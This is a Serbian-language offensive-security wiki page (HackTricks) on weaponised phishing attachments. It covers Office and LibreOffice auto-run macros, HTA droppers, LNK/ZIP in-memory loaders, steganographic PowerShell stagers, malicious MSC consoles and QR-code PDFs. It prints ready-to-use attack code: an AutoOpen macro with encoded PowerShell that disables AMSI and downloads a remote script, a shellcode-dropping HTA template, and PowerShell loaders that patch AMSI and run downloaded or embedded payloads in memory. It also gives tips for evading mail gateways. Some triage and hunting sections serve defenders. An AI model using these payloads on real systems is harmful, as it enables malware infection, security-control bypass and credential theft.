# Phishing fajlovi i dokumenti

{{#include ../../banners/hacktricks-training.md}}

## Office dokumenti

Microsoft Word obavlja validaciju podataka u fajlu pre nego što ga otvori. Validacija podataka se vrši identifikacijom strukture podataka prema standardu OfficeOpenXML. Ako tokom identifikacije strukture podataka dođe do greške, analizirani fajl neće biti otvoren.

Obično se Word fajlovi koji sadrže makroe koriste sa ekstenzijom `.docm`. Međutim, moguće je preimenovati fajl promenom ekstenzije, a da pritom zadrži mogućnost izvršavanja makroa.\
Na primer, RTF fajl po dizajnu ne podržava makroe, ali DOCM fajl preimenovan u RTF Microsoft Word će obraditi i moći će da izvršava makroe.\
Isti interni elementi i mehanizmi primenjuju se na sav softver iz paketa Microsoft Office (Excel, PowerPoint itd.).

Možete koristiti sledeću komandu da proverite koje ekstenzije će izvršavati neki Office programi:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX fajlovi koji upućuju na udaljeni template (File –Options –Add-ins –Manage: Templates –Go) koji sadrži macros mogu takođe da „izvršavaju“ macros.

### Učitavanje spoljne slike

Idite na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture i **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Učitavanje spoljne slike: Idite na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor pomoću macros

Moguće je koristiti macros za pokretanje proizvoljnog koda iz dokumenta.

#### Funkcije za automatsko učitavanje

Što su češće, to je veća verovatnoća da će ih AV otkriti.

- AutoOpen()
- Document_Open()

#### Primeri koda za macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Ručno uklanjanje metapodataka

Idite na **File > Info > Inspect Document > Inspect Document** da biste otvorili Document Inspector. Kliknite na **Inspect**, a zatim na **Remove All** pored **Document Properties and Personal Information**.

#### Ekstenzija dokumenta

Kada završite, izaberite padajući meni **Save as type** i promenite format iz **`.docx`** u Word 97-2003 **`.doc`**.\
Uradite to zato što **ne možete da sačuvate makroe unutar `.docx`** i zato što postoji **negativna stigma** **oko** ekstenzije **`.docm`** koja podržava makroe (npr. ikona sličice ima veliko `!`, a neki web/email gateway sistemi ih potpuno blokiraju). Zato je ova **zastarela ekstenzija `.doc` najbolji kompromis**.

#### Generatori zlonamernih makroa

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT makroi koji se automatski pokreću (Basic)

LibreOffice Writer dokumenti mogu da sadrže Basic makroe i da ih automatski izvrše kada se datoteka otvori, tako što se makro poveže sa događajem **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Jednostavan reverse shell makro izgleda ovako:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Obratite pažnju na dvostruke navodnike (`""`) unutar stringa – LibreOffice Basic ih koristi za escape-ovanje literalnih navodnika, tako da payload-i koji se završavaju sa `...==""")` imaju pravilno uparene i unutrašnju komandu i argument za Shell.

Saveti za isporuku:

- Sačuvajte kao `.odt` i povežite makro sa događajem dokumenta kako bi se odmah pokrenuo pri otvaranju.
- Pri slanju e-pošte pomoću `swaks`, koristite `--attach @resume.odt` (`@` je obavezan da bi se bajtovi fajla, a ne tekst imena fajla, poslali kao prilog). Ovo je ključno pri zloupotrebi SMTP servera koji prihvataju proizvoljne primaoce `RCPT TO` bez validacije.

## HTA datoteke

HTA je Windows program koji **kombinuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao aplikacija kojoj se „u potpunosti veruje“, bez ograničenja bezbednosnog modela pregledača.

HTA se izvršava pomoću **`mshta.exe`**, koji se obično **instalira** zajedno sa **Internet Explorer-om**, zbog čega `mshta` zavisi od IE-a. Ako je IE deinstaliran, HTA datoteke neće moći da se izvršavaju.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Lažne kartice priloga u HTML imejlu

HTML imejl može da oponaša izvornu karticu za pregled priloga nekog provajdera, a da pritom ne sadrži pravi prilog. Talos je zabeležio Gmail karticu rekonstruisanu od četiri Base64-kodirana inline PNG MIME dela. Ceo vizuelni element bio je obuhvaćen jednim anchor elementom, a vrednost primaoca u `?m=<target-id>` omogućavala je praćenje po primaocu. Link je počinjao sa `//`, a ne sa `http://` ili `https://`; pregledači razrešavaju taj oblik relativan u odnosu na protokol, ali alati za izdvajanje URL-ova koji prepoznaju samo potpuno kvalifikovane URL-ove mogu da ga propuste.<sup>[[11]](#references)</sup>

Tokom analize pregledajte sirovi MIME umesto da verujete prikazanoj listi priloga. Rekonstruišite kako se inline delovi slike spajaju u vizuelnu karticu, identifikujte anchor element koji je obuhvata i normalizujte vrednosti `href` relativne u odnosu na protokol pre izdvajanja URL-ova.<sup>[[11]](#references)</sup>

Za testiranje lažiranja pošiljaoca u envelope/header poljima i DMARC usklađenosti pogledajte [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Prinudna NTLM autentifikacija

Postoji nekoliko načina da se NTLM autentifikacija **daljinski prinudi**. Na primer, možete dodati **nevidljive slike** u imejlove ili HTML komе ће korisnik pristupiti (čak i preko HTTP MitM?). Ili poslati žrtvi **putanju do datoteka** koje će **pokrenuti** **autentifikaciju** samim **otvaranjem fascikle**.

**Proverite ove i druge ideje na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da ne možete samo da ukradete hash ili autentifikaciju, već možete i da **izvedete NTLM relay napade**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (lanac bez datoteka)

Veoma efikasne kampanje isporučuju ZIP datoteku koja sadrži dva legitimna dokumenta-mamca (PDF/DOCX) i zlonamernu .lnk datoteku. Trik je u tome što je stvarni PowerShell loader smešten u sirovim bajtovima ZIP datoteke, iza jedinstvenog markera, a .lnk izdvaja payload i pokreće ga u potpunosti u memoriji.<sup>[[2]](#references)</sup>

Tipičan tok koji implementira PowerShell one-liner iz .lnk datoteke:

1) Pronađi originalnu ZIP datoteku na uobičajenim lokacijama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i u nadređenoj fascikli trenutnog radnog direktorijuma.
2) Pročitaj bajtove ZIP datoteke i pronađi hardkodirani marker (npr. xFIQCV). Sve nakon markera predstavlja ugrađeni PowerShell payload.
3) Kopiraj ZIP datoteku u %ProgramData%, raspakuj je tamo i otvori dokument-mamac .docx kako bi delovala legitimno.
4) Zaobiđi AMSI za trenutni proces: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Dekodiraj sledeću fazu (npr. ukloni sve znakove #) i izvrši je u memoriji.

Primer PowerShell kostura za izdvajanje i pokretanje ugrađene faze:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Beleške
- Isporuka često zloupotrebljava poddomene renomiranih PaaS servisa (npr., *.herokuapp.com) i može da ograniči pristup payload-ima (isporučujući bezazlene ZIP-ove na osnovu IP adrese/UA).
- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga pomoću Reflection.Emit + VirtualAlloc kako bi se svelo na minimum ono što ostaje na disku.

Persistence korišćen u istom lancu
- COM TypeLib hijacking Microsoft Web Browser kontrole, tako da IE/Explorer ili bilo koja aplikacija koja je ugrađuje automatski ponovo pokrene payload.<sup>[[2]](#references)[[4]](#references)</sup> Detalje i komande spremne za upotrebu pogledajte ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Potraga/IOCs
- ZIP fajlovi koji sadrže ASCII marker string (npr., xFIQCV) dodat na kraj podataka arhive.
- .lnk koji pretražuje nadređene/korisničke fascikle kako bi pronašao ZIP i otvorio dokument-mamac.
- AMSI menjanje preko [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Dugotrajne poslovne prepiske koje se završavaju linkovima hostovanim na pouzdanim PaaS domenima.

## LNK etapno izvršavanje prvo uz mamac → persistence preko zakazanog zadatka → trusted CPL side-loading

Još jedan čest obrazac je **`.lnk` koji se predstavlja kao dokument** i odmah otvara bezazlen mamac, dok u pozadini priprema pravi lanac.<sup>[[3]](#references)</sup>

Uočeni tok rada:
1. Prečica **se maskira kao PDF** i koristi `conhost.exe` ili sličan proxy da pokrene obfuskovani PowerShell downloader.
2. PowerShell deli očigledne tokene (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), pa jednostavne detekcije koje traže `iwr`, `gci`, `ren`, `cpi` ili `schtasks` ne prepoznaju komandu.
3. Stager prvo preuzima **dokument-mamac**, otvara ga žrtvi, a zatim u pozadini ponovo sastavlja maliciozne fajlove.
4. Payload-и mogu biti zapisani sa **besmislenim ekstenzijama**, а zatим преименовани уклањањем допунских знакова, чиме се одлаже појава очигледних `.exe` / `.cpl` артефаката.
5. Persistence се успоставља помоћу **заказаног задатка који се покреће сваког минута** и који покреће бинарни фајл поузданог хоста са путање у коју корисник може да уписује.

Минимални трагови за тражење овог обрасца:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Koristan raspored datoteka za prepoznavanje:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Zašto je druga faza prikrivena

U studiji slučaja Rapid7, zakazani zadatak je više puta pokretao **`Fondue.exe`** iz direktorijuma `C:\Users\Public\`. Pošto je **`APPWIZ.cpl`** bio smešten pored njega i izvozio **`RunFODW`**, pouzdani Microsoft binarni fajl učitavao je attacker CPL umesto legitimne sistemske kopije.

CPL zatim:
- Čita blob **AES-256-CBC** iz `C:\Windows\Tasks\editor.dat`
- Dešifruje ga pomoću **Windows CNG / `bcrypt.dll`**
- Dodeljuje izvršivu memoriju i kopira dešifrovani shellcode u nju
- Indirektno ga izvršava tako što prosleđuje pokazivač na shellcode kao callback za **`EnumUILanguagesW`**

Vredi zasebno tražiti taj poslednji korak: malware često izbegava direktan skok `((void(*)())buf)()` i umesto toga zloupotrebljava **legitimni WinAPI koji prima callback** za prenos izvršavanja.

Dešifrovani payload u ovoj kampanji bio je **Donut** shellcode, koji je zatim u potpunosti mapirao konačni PE u memoriju i zakrpio **AMSI/WLDP/ETW** u trenutnom procesu pre nego što je predao izvršavanje. Detaljnije beleške o side-loading-u i post-processing-u u memoriji potražite ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktični pokazatelji za lov:
- `.lnk` pokreće `powershell.exe` ili `conhost.exe`, a zatim se prikazuje dokument-mamac.
- Kratkotrajna preuzimanja u **`C:\Users\Public\`**, praćena trenutnim preimenovanjem iz besmislenih ekstenzija.
- Zakazani zadaci sa bezazlenim imenima kao što je `GoogleErrorReport`, koji se izvršavaju iz **direktorijuma u koje korisnik može da upisuje**.
- Pouzdani binarni fajlovi učitavaju **`.cpl` / `.dll`** datoteke iz istog direktorijuma koji nije sistemski.
- Base64 tekstualni blobovi se zapisuju u **`C:\Windows\Tasks\`**, a zatim ih čita side-loaded modul.

## Payload-i omeđeni steganografskim markerima u slikama (PowerShell stager)

Novi loader lanci isporučuju zamagljeni JavaScript/VBS koji dekodira i pokreće Base64 PowerShell stager. Taj stager preuzima sliku (često GIF) koja sadrži Base64-kodirani .NET DLL, skriven kao običan tekst između jedinstvenih početnih i završnih markera. Skripta traži ove delimitere (primeri zabeleženi u stvarnim napadima: «<<sudo_png>> … <<sudo_odt>>>»), izdvaja tekst između njih, dekodira ga iz Base64 u bajtove, učitava assembly u memoriju i poziva poznatu ulaznu metodu sa C2 URL-om.<sup>[[5]](#references)</sup>

Tok rada
- Faza 1: Arhivirani JS/VBS dropper → dekodira ugrađeni Base64 → pokreće PowerShell stager sa -nop -w hidden -ep bypass.
- Faza 2: PowerShell stager → preuzima sliku, izdvaja Base64 omeđen markerima, učitava .NET DLL u memoriju i poziva njegovu metodu (npr. VAI) uz C2 URL i opcije.
- Faza 3: Loader preuzima konačni payload i obično ga ubacuje pomoću process hollowing-a u pouzdani binarni fajl (najčešće MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Više o process hollowing-u i proxy izvršavanju preko pouzdanih uslužnih programa pročitajte ovde:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell primer za izdvajanje DLL-a iz slike i pozivanje .NET metode u memoriji:

<details>
<summary>PowerShell alat za izdvajanje stego payload-a i loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Napomene
- Ovo je ATT&CK T1027.003 (steganografija/sakrivanje markera).<sup>[[6]](#references)</sup> Markeri se razlikuju među kampanjama.
- AMSI/ETW bypass i deobfuskacija stringova se obično primenjuju pre učitavanja assembly-ja.
- Hunting: skenirajte preuzete slike u potrazi za poznatim delimiterima; identifikujte PowerShell koji pristupa slikama i odmah dekodira Base64 blobove.

Pogledajte i stego alate i tehnike izdvajanja podataka:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → PowerShell staging preko Base64

Česta početna faza je mala, snažno obfuskovana `.js` ili `.vbs` datoteka isporučena unutar arhive. Njena jedina svrha je da dekodira ugrađeni Base64 string i pokrene PowerShell sa `-nop -w hidden -ep bypass` kako bi preko HTTPS-a pokrenuo sledeću fazu.<sup>[[5]](#references)</sup>

Osnovna logika (apstraktno):
- Pročita sadržaj sopstvene datoteke
- Pronađe Base64 blob između besmislenih stringova
- Dekodira ga u ASCII PowerShell
- Izvrši ga pomoću `wscript.exe`/`cscript.exe`, koji pokreću `powershell.exe`

Hunting signali
- Arhivirani JS/VBS prilozi koji pokreću `powershell.exe`, uz `-enc`/`FromBase64String` u komandnoj liniji.
- `wscript.exe` koji pokreće `powershell.exe -nop -w hidden` iz privremenih korisničkih direktorijuma.

## MSC dokumenti kao kontejneri za izvršavanje (GrimResource)

Microsoft Management Console datoteke (`.msc`) su XML definicije konzole koje se obično otvaraju pomoću `mmc.exe`. **GrimResource** zloupotrebljava referencu `StringTable` na resurs `apds.dll` koji sadrži stari XSS primitiv, pa se pri otvaranju posebno pripremljene konzole pokreće JavaScript unutar `mmc.exe`. Uočeni uzorci kombinovali su obfuskaciju zasnovanu na `transformNode` sa **DotNetToJScript** kako bi instancirali .NET payload bez uobičajenog Office macro puta.<sup>[[9]](#references)</sup>

Za statičku trijažu, tretirajte MSC datoteku od nepoznatog izvora kao tekst i **nemojte** dvaput da kliknete na nju:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Runtime indikatori visoke pouzdanosti su kada `mmc.exe` učitava CLR ili skriptne komponente, uspostavlja mrežne veze ili pokreće `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ili neočekivanu izvršnu datoteku. Format je legitiman, zato detekcije treba da korelišu **poreklo + sumnjiv XML/skriptni sadržaj + ponašanje `mmc.exe`**, umesto da blokiraju svaki MSC.<sup>[[9]](#references)</sup>

## PDF/QR preusmerivači i uslovno isporučivanje payload-a

PDF ne mora da sadrži exploit da bi bio koristan. U nedavnim kampanjama u dokument koji izgleda bezazleno postavljaju se **QR kod ili običan link**, čime se sesija pregledača izmešta izvan kontrola e-pošte, a odredište se personalizuje adresom primaoca. Microsoft je dokumentovao PDF-ove iz 2025. čiji su QR URL-ovi bili jedinstveni za svakog primaoca i vodili do RaccoonO365 infrastrukture za krađu akreditiva; paralelni lanac koristio je IP/environment gating da odabranim posetiocima prikaže JavaScript/MSI putanju, a skenerima ili nedozvoljenim klijentima bezazlen PDF.<sup>[[10]](#references)</sup>

Pri trijaži proverite i PDF akcije i QR kodove prikazane na stranici. QR kod može biti nacrtan vektorski, umesto da bude sačuvan kao slika koja se može izdvojiti, zato rasterizujte svaku stranicu, kao i izdvojene ugrađene slike:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Pregledajte dekodirana odredišta i preusmeravanja iz izolovanog sistema za analizu, bez prijavljivanja. Korisni pokazatelji za pretragu uključuju PDF-ove koji sadrže samo QR kodove uz gotovo prazne poruke e-pošte, adresu e-pošte primaoca ugrađenu u parametar upita, nekoliko preusmeravanja preko pouzdanih hosting servisa i različit sadržaj koji se vraća u zavisnosti od IP adrese, geolokacije, kolačića, referrer-a ili user-agent-a. Uporedite zahteve koristeći kontrolisane profile jer jedno preuzimanje iz sandbox-a može dobiti samo mamac.<sup>[[10]](#references)</sup>

## Windows fajlovi za krađu NTLM hash-eva

Pogledajte stranicu o **mestima za krađu NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine kampanja: sofisticirani phishing napad usmeren na kompanije u SAD](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: praćenje tradecraft-a Dropping Elephant kroz lanac loader-a s temom Kine](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nova COM tehnika za postojanost (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader isporučuje niz infostealer-a](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console za početni pristup i izbegavanje detekcije](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Akteri pretnji koriste poresku sezonu za sprovođenje phishing kampanja s temom poreza](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Lanac isporuke UAT-11587 i Antino backdoor](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
